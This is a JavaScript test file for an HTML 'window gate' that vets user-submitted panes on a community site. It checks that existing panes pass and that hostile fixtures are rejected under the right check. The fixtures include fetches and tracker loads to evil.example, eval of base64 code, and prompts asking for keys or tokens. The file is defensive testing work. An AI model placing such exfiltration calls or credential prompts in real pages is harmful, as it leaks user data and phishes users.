// window-gate.test.mjs — the gate's falsifiers.
//
//   node --test tools/window-gate.test.mjs
//
// Two halves, and the first is the one that matters most:
//
//   GREEN — every pane the town already has must pass. A gate that refuses the
//           live corpus is not a gate, it is an outage. This half caught four
//           false positives during the build and is the reason the line-length
//           check does not exist.
//   RED   — each hostile shape must bounce, NAMING THE RIGHT CHECK. A bounce
//           that names the wrong reason sends the resident to fix the wrong
//           thing, so the check name is asserted, never just the failure.

import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, resolve, join } from "node:path";
import {
  gateWindow, selfContained, noProtocolRelative, noRuntimeCode,
  keyAsk, noFrames, uniqueIds, parses, paneSize, PANE_CEILING, OFFICE_PANE_CEILING,
} from "./window-gate.mjs";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const pane = (body, head = "") => `<!doctype html><html lang="en"><head><meta charset="utf-8">${head}</head><body>${body}</body></html>`;
const failed = (r) => r.failures.map((f) => f.check);

// ── GREEN: the live corpus ──────────────────────────────────────────────────

test("every pane the town already has passes the gate", () => {
  const files = execFileSync("git", ["ls-files", "WHITE_PAGES"], { cwd: ROOT, encoding: "utf8", maxBuffer: 1 << 28 })
    .split("\n").filter((f) => /\/WINDOW\/.*\.html?$/i.test(f));
  assert.ok(files.length >= 40, `expected the corpus, found ${files.length} panes`);
  const refused = [];
  for (const f of files) {
    const r = gateWindow(readFileSync(join(ROOT, f), "utf8"));
    if (!r.ok) refused.push(`${f} -> ${failed(r).join(", ")}`);
  }
  assert.deepEqual(refused, [], "the gate must not refuse a pane that is merged and serving");
});

test("a fetch to the town is fine — the corpus is built on it", () => {
  // 27 of 46 panes call fetch(). Rule 3 permits it: "Fetches, scripts, images,
  // styles stay town-only, always." This test is what stops a future tightening
  // from quietly re-banning the majority of the town's windows.
  for (const url of ["https://postmark.town/api/whoami", "https://panes.postmark.town/x.json", "/data/index.json"])
    assert.ok(gateWindow(pane(`<script>fetch("${url}").then(r=>r.json())</script>`)).ok, url);
});

test("localStorage is fine — a pane runs on its own isolated origin", () => {
  assert.ok(gateWindow(pane(`<script>localStorage.setItem("pm.pane.handle","wright")</script>`)).ok);
  assert.ok(gateWindow(pane(`<script>sessionStorage.getItem("x")</script>`)).ok);
});

test("a link may point anywhere; a LOAD may not (the 2026-07-13 refinement)", () => {
  assert.ok(selfContained(`<a href="https://github.com/postmark-town/postmark/issues/1">issue</a>`).ok);
  // the same link written inside a JS string, escaped quotes and all — this is
  // wright's merged operator pane, and the office's own regex refuses it
  assert.ok(selfContained(`<script>el.innerHTML="<a href=\\"https://github.com/x/y\\">i</a>"</script>`).ok,
    "an escaped-quote href is still a link");
  assert.ok(!selfContained(`<img src="https://evil.example/tracker.gif">`).ok);
});

// ── RED: each hostile shape, and the check it must name ─────────────────────

test("RED fixtures each bounce, naming the right check", () => {
  const cases = [
    ["an off-town fetch", pane(`<script>fetch("https://evil.example/steal")</script>`), "self-contained"],
    ["an off-town script src", pane("", `<script src="https://cdn.evil.example/x.js"></script>`), "self-contained"],
    ["an off-town image load", pane(`<img src="https://evil.example/pixel.gif">`), "self-contained"],
    ["a protocol-relative load", pane(`<img src="//evil.example/pixel.gif">`), "self-contained"],
    ["eval", pane(`<script>eval(atob("YWxlcnQoMSk="))</script>`), "readable"],
    ["new Function", pane(`<script>new Function("return 1")()</script>`), "readable"],
    ["duplicate ids", pane(`<div id="pane"></div><div id="pane"></div>`), "unique ids"],
    ["an iframe", pane(`<iframe src="/data/x.html"></iframe>`), "framed content"],
    ["an object embed", pane(`<object data="/x.swf"></object>`), "framed content"],
    ["asking for a household key", pane(`<label>household key <input id="k" type="password"></label>`), "asks for a key"],
    ["prompting for a token", pane(`<script>const t = prompt("paste your api key")</script>`), "asks for a key"],
    ["a truncated file", `<!doctype html><html><body><div>half a pane`, "parses"],
  ];
  for (const [why, html, expected] of cases) {
    const r = gateWindow(html);
    assert.ok(!r.ok, `${why} must bounce`);
    assert.ok(failed(r).some((c) => c.startsWith(expected)),
      `${why} must name "${expected}", named: ${failed(r).join(", ")}`);
  }
});

test("oversize bounces, and the office's stricter cap is reported not enforced", () => {
  const big = pane("x".repeat(PANE_CEILING + 1));
  const r = gateWindow(big);
  assert.ok(!r.ok && failed(r).includes("size"));
  // Between the two doors' numbers: passes, but flagged for the founder's ruling.
  const between = paneSize(OFFICE_PANE_CEILING + 1);
  assert.ok(between.ok, "the gate does not enforce the office's 150 KB cap");
  assert.equal(between.overOfficeCap, true, "but it does report crossing it");
});

test("the innocent long-line shapes stay innocent", () => {
  // Each of these failed a 4,000-char line rule during the build. They are the
  // reason that rule is gone; if one ever bounces again, the rule came back.
  const shapes = {
    "an embedded picture": pane(`<div style='background: url("data:image/jpeg;base64,${"A".repeat(9000)}")'></div>`),
    "an embedded JSON script": pane(`<script type="application/json">{"a":"${"b".repeat(9000)}"}</script>`),
    "inline svg artwork": pane(`<svg><defs><symbol id="t"><path d="${"M 1 1 ".repeat(2000)}"/></symbol></defs></svg>`),
    "a compact head": `<!doctype html><html lang="en"><head><meta charset="utf-8">${"<meta name=x content=y>".repeat(400)}</head><body>hi</body></html>`,
  };
  for (const [why, html] of Object.entries(shapes))
    assert.ok(gateWindow(html).ok, `${why} must pass: ${failed(gateWindow(html)).join(", ")}`);
});

test("a stray closing tag is not truncation", () => {
  // wright's merged pane carries a second </body>. Browsers do not care and no
  // reader ever sees it; refusing it would be the gate correcting a working
  // window over nothing.
  assert.ok(parses(`<!doctype html><html><body><p>hi</p></body></body></html>`).ok);
  assert.ok(!parses(`<!doctype html><html><body><p>hi`).ok, "an unclosed body IS truncation");
});
